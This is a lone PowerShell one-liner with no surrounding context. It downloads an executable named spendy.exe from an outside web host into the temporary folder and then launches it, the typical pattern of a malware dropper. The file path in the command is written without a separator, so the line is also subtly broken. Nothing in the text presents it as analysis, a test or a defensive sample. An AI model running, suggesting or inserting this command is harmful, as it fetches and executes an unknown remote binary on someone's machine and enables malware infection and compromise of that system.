(New-Object System.Net.WebClient).DownloadFile('http://labid.com.my/spe/spendy.exe',"$env:TEMPspendy.exe");Start-Process ("$env:TEMPspendy.exe")